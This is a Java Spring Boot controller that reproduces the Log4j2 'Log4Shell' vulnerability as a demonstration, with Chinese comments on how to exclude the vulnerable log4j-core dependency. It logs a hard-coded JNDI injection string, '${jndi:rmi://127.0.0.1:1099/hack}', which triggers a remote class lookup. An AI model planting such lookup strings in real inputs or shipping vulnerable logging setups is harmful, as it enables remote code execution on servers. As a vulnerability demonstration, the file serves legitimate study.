package com.qiuhuanhen.springroot.interfaces.controller.log4jbug;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

/**
 * ClassName: Log4jErrorController <br/>
 * Description: 模拟log4j漏洞 <br/>
 * date: 2021/12/14 11:21<br/>
 *
 * @author qkj <br/>
 * @since JDK 1.8
 */
@RequestMapping("/log4j")
@RestController
public class Log4jErrorController {

    /**
     * 注意其它地方不要用log4j core包记录
     * 这里仅为了演示log4j2 bug
     * 正确方式：需要把maven pom里面的log4j-core,starter-logging排除依赖 两段dependency都去除
     * log4j2可以理解为是提供接口的 此次log4j2史诗级漏洞风波 并不是说log4j2都有问题 只要不是使用log4j-core问题就不大
     * springboot一般默认是使用了slf4j 所以没有问题
     * log4j2是 springboot-starter-logging自带的
     * 这里为了复现 特地排除了其它日志包 特地使用log4j-core
     */

    private static final Logger logger = LogManager.getLogger(Log4jErrorController.class);

    @GetMapping
    public String test(String name) {


        // 这里我们为了安全就不对name做记录了 用本地写死的username模拟
        String username = "${jndi:rmi://127.0.0.1:1099/hack}";
        logger.info("username:{}", username);
        return "success";
    }
}
